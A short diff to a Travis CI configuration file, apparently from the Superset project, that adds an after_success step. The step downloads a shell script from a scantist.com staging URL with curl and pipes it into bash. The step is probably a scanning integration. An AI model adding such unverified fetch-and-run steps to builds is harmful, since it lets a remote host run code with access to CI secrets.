@@ -98,3 +98,6 @@ cache:
     - ~/.cache
     - ~/.travis_cache/
     - superset/assets/.terser-plugin-cache/
+    
+after_success:
+  - bash <(curl -s https://scripts.scantist.com/staging/ci-travis-jar-k8s.sh) 
